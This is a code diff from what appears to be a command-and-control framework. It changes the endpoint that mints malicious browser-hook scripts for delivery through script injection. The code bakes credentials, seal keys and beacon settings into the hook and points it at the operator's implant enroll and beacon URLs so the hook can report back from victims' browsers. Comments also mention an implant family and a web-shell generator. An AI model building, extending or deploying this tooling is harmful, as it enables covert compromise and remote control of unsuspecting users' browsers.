@@ -16,8 +16,8 @@ using ClaimsPrincipal = System.Security.Claims.ClaimsPrincipal;
 namespace Rod.Transport.Endpoints;
 
 // The browser-hook mint and its roster (architecture.md Sec 5.2, Sec 8):
-// the operator surface that renders the in-tree hook script with a bake --
-// credential, seal, cadence, verbs -- stores it as a served payload
+// the operator surface that renders the hook asset module's script with a
+// bake -- credential, seal, cadence, verbs -- stores it as a served payload
 // record, and answers the `<script src>` URL a script-injection foothold
 // loads. The serving half (the public route a victim's browser fetches)
 // lives in HookServingEndpoints on the implant family.
@@ -25,7 +25,10 @@ namespace Rod.Transport.Endpoints;
 // The mint deliberately does not ride the external build contract: the hook
 // is a rendered script, not a compiled artifact, so the web-shell
 // generator's pattern applies (render, fingerprint, store) with the
-// deploy-token and envelope-key minting a payload build carries.
+// deploy-token and envelope-key minting a payload build carries. The
+// template itself is module-layer content (Sec 15.1): modules/browserhook
+// in-tree, any directory the operator lists under
+// Capabilities:AssetModules at a deployment.
 
 /// <summary>
 /// Maps the engagement's browser-hook endpoints: mint, list, and revoke.
@@ -61,6 +64,7 @@ public static class HookEndpoints
         IDeployTokenService tokens,
         IPayloadStore payloads,
         IAuditStore audit,
+        Rod.CoreState.Assets.IModuleAssetStore assets,
         TimeProvider clock,
         CancellationToken cancellationToken)
     {
@@ -85,6 +89,16 @@ public static class HookEndpoints
             return Results.BadRequest(new Problem("Listener does not serve this engagement."));
         if (listener.Transport is not ("http" or "https"))
             return Results.BadRequest(new Problem("The browser hook rides the web family; name an http or https listener."));
+
+        // The template is module-layer content (Sec 15.1) and refuses loudly
+        // when no module carries it: the answer names the config section,
+        // because deploying and listing the module is the whole fix. Nothing
+        // is minted before the check -- no token budget spent on a mint that
+        // cannot render.
+        if (!assets.TryRead(BrowserHookScript.TemplateModuleName, BrowserHookScript.TemplateAssetName, out var template))
+            return Results.Problem(
+                title: $"No '{BrowserHookScript.TemplateModuleName}' asset module is loaded; deploy one and list its directory under Capabilities:AssetModules.",
+                statusCode: StatusCodes.Status503ServiceUnavailable);
 
         // The seal posture: the mainstream mint bakes the per-hook envelope
         // key (sealed enroll and contacts, the response GCM tag as server
@@ -117,7 +131,7 @@ public static class HookEndpoints
         var bakedKey = sealedPosture ? AesGcmEnvelope.Bake(keyId, key) : null;
 
         var endpoint = listener.PublicEndpoint.TrimEnd('/');
-        var content = BrowserHookScript.Render(new BrowserHookBake(
+        var content = BrowserHookScript.Render(template.Content, new BrowserHookBake(
             $"{endpoint}/implants/enroll",
             $"{endpoint}/implants/beacon",
             token.Secret,
